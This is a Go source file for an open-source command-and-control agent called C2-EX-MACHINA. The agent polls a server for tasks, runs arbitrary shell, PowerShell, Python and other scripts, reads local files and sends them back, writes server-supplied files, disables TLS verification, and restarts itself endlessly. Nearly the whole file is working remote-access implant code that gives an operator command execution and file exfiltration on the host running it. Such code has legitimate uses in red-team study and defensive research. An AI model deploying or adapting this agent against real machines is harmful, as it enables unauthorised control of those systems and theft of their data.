/*
    This file implements an agent for C2-EX-MACHINA project.
*/

//    This file implements an agent for C2-EX-MACHINA project.
//    Copyright (C) 2023  C2-EX-MACHINA

//    This program is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.

//    This program is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.

//    You should have received a copy of the GNU General Public License
//    along with this program.  If not, see <https://www.gnu.org/licenses/>.

package main

import (
    "io"
    "os"
    "fmt"
    "log"
    "time"
    "bytes"
    "context"
    "os/exec"
    "runtime"
    "strconv"
    "strings"
    "net/url"
    "net/http"
    "math/rand"
    "io/ioutil"
    "crypto/tls"
    "path/filepath"
    "encoding/json"
    "container/list"
)

var authors = [2]string{"evaris237", "KrysCat-KitKat"}
var _url = "https://github.com/C2-EX-MACHINA/Agent/"
var license = "GPL-3.0 License"
var version = "0.0.1"

var copyright = `
C2-EX-MACHINA  Copyright (C) 2023  C2-EX-MACHINA
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
`

const is_windows = runtime.GOOS == "windows"
const key_characters = "KEbB+<U@D]Z}-NA\\m!au)cq6[iWVlv,3hj50ro2(>ITGt8Q.dzXSL*&|w_p=MPk4xsJ9R{y1efY^FO7n$gHC"

/*
    LevelLogger is a Logger that manage levels
    and 5 defaults levels.
*/
type LevelLogger struct {
    *log.Logger
    level  int
    format string
    levels map[int]string
}

/*
    This function makes the default logger.

    format:
    [%(date)] %(levelname) \t(%(levelvalue)) \{\{%(file):%(line)\}\} :: %(message)
*/
func DefaultLogger() LevelLogger {
    logger := LevelLogger{
        log.Default(),
        0, // 0 -> all logs (lesser than DEBUG (10) level)
        "\b] %(levelname) \t(%(levelvalue)) {{%(file):%(line)}} :: %s",
        make(map[int]string),
    }

    logger.SetPrefix("[")

    logger.levels[10] = "DEBUG"
    logger.levels[20] = "INFO"
    logger.levels[30] = "WARNING"
    logger.levels[40] = "ERROR"
    logger.levels[50] = "CRITICAL"

    return logger
}

/*
    This function logs messages to stderr.
*/
func (logger *LevelLogger) log(level int, message string) {
    if level < logger.level {
        return
    }

    logstring := strings.Clone(logger.format)
    if strings.Contains(logstring, "%(levelname)") {
        logstring = strings.Replace(
            logstring, "%(levelname)", logger.levels[level], -1,
        )
    }

    if strings.Contains(logstring, "%(levelvalue)") {
        logstring = strings.Replace(
            logstring, "%(levelvalue)", strconv.Itoa(level), -1,
        )
    }

    _, file, line, _ := runtime.Caller(2)
    // /!\ Call from function to call log for specific level
    if strings.Contains(logstring, "%(file)") {
        logstring = strings.Replace(logstring, "%(file)", file, -1)
    }

    if strings.Contains(logstring, "%(line)") {
        logstring = strings.Replace(
            logstring, "%(line)", strconv.Itoa(line), -1,
        )
    }

    logger.Printf(logstring, message)
}

/*
    This function logs debug message.
*/
func (logger *LevelLogger) debug(message string) {
    logger.log(10, message)
}

/*
    This function logs info message.
*/
func (logger *LevelLogger) info(message string) {
    logger.log(20, message)
}

/*
    This function logs warning message.
*/
func (logger *LevelLogger) warning(message string) {
    logger.log(30, message)
}

/*
    This function logs error message.
*/
func (logger *LevelLogger) error(message string) {
    logger.log(40, message)
}

/*
    This function logs critical message.
*/
func (logger *LevelLogger) critical(message string) {
    logger.log(50, message)
}

var logger = DefaultLogger()

/*
    This type is a task result to store results in a single object.
*/
type TaskResult struct {
    id         int
    stdout     string
    stderr     string
    exit_code  int
    start_time int
    end_time   int
}

/*
    This interface defines Queue based on
    container/list object.
*/
type Queue interface {
    Front() *list.Element
    Len() int
    push(map[string]interface{})
    pop() *list.Element
}

/*
    This struct is the Queue Implementation based
    on the container/list object.
*/
type QueueImplementation struct {
    *list.List
}

/*
    This function is a wrapper for container/list.PushBack
    function for Queue Implentation.
*/
func (queue *QueueImplementation) push(value map[string]interface{}) {
    queue.PushBack(value)
}

/*
    This function gets the next element of the Queue
    and remove it.
*/
func (queue *QueueImplementation) pop() *list.Element {
    minimum := queue.Front()
    minimum_value := minimum.Value.(map[string]interface{})["Timestamp"].(int)

    for element := minimum; element != nil; element = element.Next() {
        value := element.Value.(map[string]interface{})["Timestamp"].(int)
        if value < minimum_value {
            minimum_value = value
            minimum = element
        }
    }

    queue.List.Remove(minimum)
    return minimum
}

var tasks_queue map[int]Queue

/*
    This function is like a constructor for Queue.
*/
func newQueue() Queue {
    return &QueueImplementation{list.New()}
}

/*
    This function executes a child process (launchs
    command line, executes a script, ect...) and returns
    output, error, exit code, start time and end time.
*/
func executeProcess(
    timeout int, launcher string, arguments ...string,
) (string, string, int, int, int) {
    var stdout, stderr bytes.Buffer
    var cmd *exec.Cmd

    if timeout == 0 {
        logger.debug("Create subprocess without timeout")
        cmd = exec.Command(launcher, arguments...)
    } else {
        logger.debug("Create subprocess with timeout")
        ctx, cancel := context.WithTimeout(
            context.Background(),
            time.Duration(timeout)*time.Second,
        )
        defer cancel()
        cmd = exec.CommandContext(ctx, launcher, arguments...)
    }

    cmd.Stdout = &stdout
    cmd.Stderr = &stderr

    start_time := int(time.Now().Unix())
    error := cmd.Run()
    end_time := int(time.Now().Unix())

    exit_code := cmd.ProcessState.ExitCode()
    logger.debug("Subprocess terminated.")

    if error != nil {
        error_message := error.Error()
        logger.warning(
            fmt.Sprintf(
                "Error executing subprocess, error code: %d (%s)",
                exit_code,
                error_message,
            ),
        )
        return "", error_message, exit_code, start_time, end_time
    }

    return stdout.String(), stderr.String(), exit_code, start_time, end_time
}

/*
    This function performs MEMORYSCRIPT tasks and returns the
    task result.
*/
func processScriptMemoryTask(task map[string]interface{}) TaskResult {
    launcher, _, arguments := getLauncherAndProperties(
        task["Filename"].(string), true,
    )

    stdout, stderr, exit_code, start_time, end_time := executeProcess(
        getTimeout(task), launcher, arguments...,
    )

    return TaskResult{
        task["id"].(int), stdout, stderr, exit_code, start_time, end_time,
    }
}

/*
    This function performs SCRIPT tasks and returns the task result.
*/
func processScriptTask(task map[string]interface{}) TaskResult {
    launcher, extension, arguments := getLauncherAndProperties(
        task["Filename"].(string), false,
    )

    filename, error := writeTempfile(extension, task["Data"].(string))

    if error != "" {
        timestamp := int(time.Now().Unix())
        return TaskResult{task["id"].(int), "", error, 1, timestamp, timestamp}
    }

    arguments = append(arguments, filename)
    defer os.Remove(filename)

    stdout, stderr, exit_code, start_time, end_time := executeProcess(
        getTimeout(task), launcher, arguments...,
    )

    return TaskResult{
        task["id"].(int), stdout, stderr, exit_code, start_time, end_time,
    }
}

/*
    This function writes temp file and returns the filemame.
*/
func writeTempfile(extension string, content string) (string, string) {
    logger.debug(fmt.Sprintf("Write temp file with %s extension", extension))
    file, error := os.CreateTemp("", fmt.Sprintf("*%s", extension))

    if error != nil {
        error_message := fmt.Sprintf(
            "Error creating temp file: %s", error.Error(),
        )
        logger.error(error_message)
        return "", error_message
    }

    if _, error := file.Write([]byte(content)); error != nil {
        file.Close()
        error_message := fmt.Sprintf(
            "Error writting temp file: %s", error.Error(),
        )
        logger.error(error_message)
        return "", error_message
    }

    if error := file.Close(); error != nil {
        error_message := fmt.Sprintf(
            "Error closing temp file: %s", error.Error(),
        )
        logger.error(error_message)
        return "", error_message
    }

    return file.Name(), ""
}

/*
    This function defines launcher, file extension and
    arguments for subprocess.
*/
func getLauncherAndProperties(
    launcher string, in_memory bool,
) (string, string, []string) {
    var arguments []string
    var extension string

    if in_memory {
        logger.debug(fmt.Sprintf(
            "Defined launcher for in memory execution with %s", launcher,
        ))
        switch launcher {
        case "powershell":
            launcher = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
        case "python3":
            launcher = "/bin/python3"
            arguments = append(arguments, "-c")
        case "python":
            launcher = "/bin/python"
            arguments = append(arguments, "-c")
        case "python2":
            launcher = "/bin/python2"
            arguments = append(arguments, "-c")
        case "perl":
            launcher = "/bin/perl"
            arguments = append(arguments, "-E")
        case "bash":
            launcher = "/bin/bash"
            arguments = append(arguments, "-c")
        case "shell":
            launcher = "/bin/sh"
            arguments = append(arguments, "-c")
        case "batch":
            launcher = "C:\\Windows\\System32\\cmd.exe"
            arguments = append(arguments, "/c")
        }
    } else {
        logger.debug(fmt.Sprintf(
            "Defined launcher and extension for execution with %s", launcher,
        ))
        switch launcher {
        case "powershell":
            launcher = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            extension = "ps1"
        case "python3":
            launcher = "/bin/python3"
            extension = "py"
        case "python":
            launcher = "/bin/python"
            extension = "py"
        case "python2":
            launcher = "/bin/python2"
            extension = "py"
        case "perl":
            launcher = "/bin/perl"
            extension = "pl"
        case "bash":
            launcher = "/bin/bash"
            extension = "sh"
        case "shell":
            launcher = "/bin/sh"
            extension = "sh"
        case "batch":
            launcher = "C:\\Windows\\System32\\cmd.exe"
            extension = "bat"
        case "vbscript":
            launcher = "C:\\Windows\\System32\\cscript.exe"
            extension = "vbs"
        case "jscript":
            launcher = "C:\\Windows\\System32\\cscript.exe"
            extension = "js"
        }
    }

    return launcher, extension, arguments
}

/*
    This function returns a timeout from task (optional in JSON).
*/
func getTimeout(task map[string]interface{}) int {
    temp_timeout := task["Timeout"]
    timeout, ok := temp_timeout.(int)

    if !ok {
        logger.debug("No valid timeout found, set timeout to 0")
        return 0
    }
    logger.debug("Timeout defined in JSON")
    return timeout
}

/*
    This function starts the cross platform command task
    and returns the results.
*/
func processCommandTask(task map[string]interface{}) TaskResult {
    var launcher string
    var arguments []string

    if is_windows {
        launcher, _, arguments = getLauncherAndProperties("batch", true)
    } else {
        launcher, _, arguments = getLauncherAndProperties("shell", true)
    }

    command_string := task["Data"].(string)
    logger.info(
        fmt.Sprintf("Performs COMMAND task: %s", command_string),
    )

    arguments = append(arguments, command_string)
    stdout, stderr, exit_code, start_time, end_time := executeProcess(
        getTimeout(task), launcher, arguments...,
    )

    return TaskResult{
        int(task["Id"].(float64)), stdout, stderr, exit_code, start_time, end_time,
    }
}

/*
    This function downloads the file on the remote
    server and returns the task result.
*/
func processDownloadTask(task map[string]interface{}) TaskResult {
    filename := task["Data"].(string)
    logger.info(
        fmt.Sprintf("Performs DOWNLOAD task: %s", filename),
    )

    start_time := int(time.Now().Unix())
    fileContent, error := ioutil.ReadFile(filename)
    end_time := int(time.Now().Unix())
    logger.debug("File read")

    if error != nil {
        error_message := error.Error()
        logger.warning(
            fmt.Sprintf(
                "Error executing DOWNLOAD task, error: %s",
                error_message,
            ),
        )
        return TaskResult{
            task["id"].(int), "", error_message, 1, start_time, end_time,
        }
    }

    return TaskResult{
        task["id"].(int), string(fileContent), "", 0, start_time, end_time,
    }
}

/*
    This function uploads the file on the local
    machine and returns the task result.
*/
func processUploadTask(task map[string]interface{}) TaskResult {
    filename := task["Filename"].(string)
    logger.info(
        fmt.Sprintf("Performs UPLOAD task: %s", filename),
    )

    start_time := int(time.Now().Unix())
    error := ioutil.WriteFile(filename, []byte(task["Data"].(string)), 0600)
    end_time := int(time.Now().Unix())
    logger.debug("File written.")

    if error != nil {
        error_message := error.Error()
        logger.warning(
            fmt.Sprintf(
                "Error executing UPLOAD task, error: %s",
                error_message,
            ),
        )
        return TaskResult{
            task["id"].(int), "", error_message, 1, start_time, end_time,
        }
    }

    return TaskResult{task["id"].(int), "", "", 0, start_time, end_time}
}

/*
    This function generates Queue for a task
    if the task should be executed after another task.
*/
func generateQueue(task map[string]interface{}) bool {
	logger.debug("Get requirements tasks")
	after_check, error := task["After"]
	if error || after_check == nil {
		return true
	}

    after := task["After"].(int)
    if after > 0 {
    	logger.debug("Generating Queue for task: " + string(after))
        _, ok := tasks_queue[after]
        if !ok {
            tasks_queue[after] = newQueue()
        }
        tasks_queue[after].push(task)
        return false
    }

    return true
}

/*
    This function executes all tasks in the
    Queue of the current task if exist.
*/
func executeQueue(task map[string]interface{}, results chan TaskResult) {
	logger.debug("executing Queue")
    id := task["Id"].(int)
    queue, ok := tasks_queue[id]

    if !ok {
        return
    }

    for queue.Len() > 0 {
    	logger.debug("executing new task in the Queue")
        new_task := queue.pop().Value.(map[string]interface{})
        go processTask(new_task, results)
    }
}

/*
    This function get a timestamp from
    JSON interface.
*/
func getTimestamp(task map[string]interface{}) int64 {
	timestamp_check, error := task["Timestamp"]
	if error || timestamp_check == nil {
		return 0
	}
	return int64(task["Timestamp"].(float64))
}

/*
    This function executes the function for each
    tasks by task types and returns the tasks results.
*/
func processTask(task map[string]interface{}, results chan TaskResult) {
    if !generateQueue(task) {
        return
    }

    time_to_wait(getTimestamp(task))
    type_ := task["Type"].(string)
    logger.debug(fmt.Sprintf("Receive %s task", type_))

    switch type_ {
    case "COMMAND":
        results <- processCommandTask(task)
        return
    case "UPLOAD":
        results <- processUploadTask(task)
        return
    case "DOWNLOAD":
        results <- processDownloadTask(task)
        return
    case "MEMORYSCRIPT":
        results <- processScriptMemoryTask(task)
        return
    case "TEMPSCRIPT":
        results <- processScriptTask(task)
        return
    }

    logger.error("Invalid task type")
    timestamp := int(time.Now().Unix())
    results <- TaskResult{
        task["id"].(int), "", "Invalid task type", 1, timestamp, timestamp,
    }

    executeQueue(task, results)
}

/*
    This function adds C2-EX-MACHINA headers to request object.
*/
func addDefaultHeaders(request *http.Request) {
    hostname, error := os.Hostname()

    if error != nil {
        logger.error(
            fmt.Sprintf("Error getting hostname: %s", error.Error()),
        )
        hostname = "Unknown"
    }

    logger.debug("Add HTTP headers")

    request.Header.Set("Content-Type", "application/json; charset=utf-8")
    request.Header.Set(
        "Api-Key",
        "AdminAdminAdminAdminAdminAdminAdminAdminAdminAdmin" +
            "AdminAdminAdminAdminAdminAdminAdmin",
    )
    request.Header.Set(
        "User-Agent",
        fmt.Sprintf(
            "Agent-C2-EX-MACHINA %s (%s) %s",
            version,
            runtime.GOOS,
            hostname,
        ),
    )
    request.Header.Set("Origin", "http://127.0.0.1:8000")
    request.Header.Set("Content-Type", "application/json; charset=utf-8")
}

/*
    This function generates a new random key.
*/
func generate_key() string {
    key := make([]byte, 255)
    for index := range key {
        key[index] = key_characters[rand.Intn(len(key_characters))]
    }
    return string(key)
}

/*
    This function creates HTTP request object.
*/
func createRequest(method string, key string, body io.Reader) *http.Request {
    http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
    request, error := http.NewRequest(
        method,
        "http://127.0.0.1:8000/c2/order/" + key,
        body,
    )

    if error != nil {
        logger.error(fmt.Sprintf("Error creating request: %s", error.Error()))
        time.Sleep(5 * time.Second)
        return createRequest(method, key, body)
    }

    return request
}

/*
    This function sends HTTP request and returns the response body content.
*/
func sendRequest(request *http.Request, client *http.Client) []byte {
    response, error := client.Do(request)
    if error != nil {
        logger.error(fmt.Sprintf("Error sending request: %s", error.Error()))
        time.Sleep(5 * time.Second)
        return sendRequest(request, client)
    }

    defer response.Body.Close()

    logger.debug("Read the response body")
    content, error := ioutil.ReadAll(response.Body)
    if error != nil {
        logger.error(fmt.Sprintf(
            "Error reading response body: %s", error.Error(),
        ))
        time.Sleep(5 * time.Second)
        return sendRequest(request, client)
    }

    return content
}

/*
    This function parses tasks, executes it and generates the response.
*/
func processTasks(tasks []interface{}, file *os.File) []byte {
    var body []map[string]interface{}

    if len(tasks) == 0 {
        logger.info("There is no task, return default response.")
        return []byte("{\"Tasks\":[]}")
    }

    logger.debug("Parse tasks")
    task_length := len(tasks)
    results := make(chan TaskResult, task_length)

    for _, task := range tasks {
        taskMap, ok := task.(map[string]interface{})
        if !ok {
            logger.error("Invalid JSON task format.")
            return nil
        } else {
            go processTask(taskMap, results)
        }
    }

    counter := 1
    for result := range results {
        logger.debug("Generate a task result")
        body = append(body, map[string]interface{}{
            "Id":        result.id,
            "Stdout":    result.stdout,
            "Stderr":    result.stderr,
            "Status":    result.exit_code,
            "StartTime": result.start_time,
            "EndTime":   result.end_time,
        })
        if counter >= task_length {
        	close(results)
        } 
    	counter += 1
    }

    logger.info("Generate tasks results")
    data, error := json.Marshal(map[string]interface{}{
        "Tasks": body,
    })
    if error != nil {
        logger.error(
            fmt.Sprintf("Error encoding JSON payload: %s", error.Error()),
        )
        return nil
    }

    addJsonLog(file, string(data))
    return data
}

/*
    This function waits until the unixepochtime argument.
*/
func time_to_wait(epoch int64) {
    time_to_sleep := epoch - time.Now().Unix()
    if time_to_sleep > 0 {
        logger.debug(fmt.Sprintf("Wait %d seconds", time_to_sleep))
        time.Sleep(time.Duration(time_to_sleep) * time.Second)
    }
}

/*
    This function open a log file.
*/
func openLogFile(filename string) *os.File {
    file, error := os.OpenFile(
        filename, os.O_APPEND | os.O_WRONLY | os.O_CREATE, 0600,
    )

    if error != nil {
        panic(error)
    }

    return file
}

/*
    This function adds a new online JSON object to a JSON log file.
*/
func addJsonLog(file *os.File, data string) {
    _, error := file.WriteString(data + "\n")
    if error != nil {
        logger.error(
            fmt.Sprintf(
                "Error writing new JSON log in file: %s (%s)",
                error.Error(),
                data,
            ),
        )
        return
    }

    error = file.Sync()
    if error != nil {
        logger.error(
            fmt.Sprintf(
                "Error writing new JSON log in file: %s (%s)",
                error.Error(),
                data,
            ),
        )
        return
    }
}

/*
    This function creates and opens data directory
    and files (logs, secret key...)
*/
func open_data_files() (*os.File, *os.File, string) {
    logger.debug("Create and open data directory and files...")
    executable, error := os.Executable()
    if error != nil {
    	if error != nil {
            logger.critical(
                fmt.Sprintf("Error to get executable name: %s", error.Error()),
            )
            panic(error)
        }
    }
    data_path := filepath.Join(filepath.Dir(executable), "data")

    _, error = os.Stat(data_path)
    if os.IsNotExist(error) {
        error = os.Mkdir(data_path, os.ModePerm)
        if error != nil {
            logger.critical(
                fmt.Sprintf("Error creating data directory: %s", error.Error()),
            )
            panic(error)
        }
    }

    tasks_log_file := openLogFile(filepath.Join(data_path, "tasks.json"))
    results_log_file := openLogFile(filepath.Join(data_path, "results.json"))

    return tasks_log_file, results_log_file, get_key(data_path)
}

/*
	This function returns the secret agent key.
*/
func get_key(data_path string) string {
	var key string
    key_file := filepath.Join(data_path, "key.txt")

    _, error := os.Stat(key_file)
    if os.IsNotExist(error) {
    	key = url.QueryEscape(generate_key())

    	error = os.WriteFile(key_file, []byte(key), 0600)
    	if error != nil {
    		logger.critical(
                fmt.Sprintf("Error writing key file: %s", error.Error()),
            )
            panic(error)
    	}

    } else {

    	keybytes, error := os.ReadFile(key_file)
    	if error != nil {
    		logger.critical(
                fmt.Sprintf("Error reading key file: %s", error.Error()),
            )
            panic(error)
        }
        key = string(keybytes)
    }

    return key
}

/*
    This function starts the agent and loop until there is
    no error to request, execute and send tasks output to
    server from the local machine.
*/
func runAgent() {
    logger.debug("Start agent")
    client := &http.Client{}

    tasks_log_file, results_log_file, key := open_data_files()
    defer tasks_log_file.Close()
    defer results_log_file.Close()

    logger.debug("Create first request")
    request := createRequest("GET", key, nil)
    addDefaultHeaders(request)
    content := sendRequest(request, client)

    for {
        addJsonLog(tasks_log_file, string(content))

        var order map[string]interface{}
        logger.debug("Parse JSON")
        error := json.Unmarshal(content, &order)
        if error != nil {
            logger.error(
                fmt.Sprintf("Error decoding JSON response: %s", error.Error()),
            )
            return
        }

        data := processTasks(order["Tasks"].([]interface{}), results_log_file)
        if data == nil {
            return
        }

        time_to_wait(int64(order["NextRequestTime"].(float64)))

        request = createRequest("POST", key, bytes.NewReader(data))
        addDefaultHeaders(request)
        content = sendRequest(request, client)
    }
}

/*
    This function starts the C2-EX-MACHINA agent
    and run it for ever.
*/
func main() {
    fmt.Println(copyright)

    fmt.Println(`
    ░█████╗░██████╗░░░░░░░███████╗██╗░░██╗░░░░░░███╗░░░███╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░█████╗░
    ██╔══██╗╚════██╗░░░░░░██╔════╝╚██╗██╔╝░░░░░░████╗░████║██╔══██╗██╔══██╗██║░░██║██║████╗░██║██╔══██╗
    ██║░░╚═╝░░███╔═╝█████╗█████╗░░░╚███╔╝░█████╗██╔████╔██║███████║██║░░╚═╝███████║██║██╔██╗██║███████║
    ██║░░██╗██╔══╝░░╚════╝██╔══╝░░░██╔██╗░╚════╝██║╚██╔╝██║██╔══██║██║░░██╗██╔══██║██║██║╚████║██╔══██║
    ╚█████╔╝███████╗░░░░░░███████╗██╔╝╚██╗░░░░░░██║░╚═╝░██║██║░░██║╚█████╔╝██║░░██║██║██║░╚███║██║░░██║
    ░╚════╝░╚══════╝░░░░░░╚══════╝╚═╝░░╚═╝░░░░░░╚═╝░░░░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝╚═╝░░╚═╝`)

    for {
        runAgent()
        logger.warning("Run agent end, restarting agent...")
        time.Sleep(5 * time.Second)
    }
}
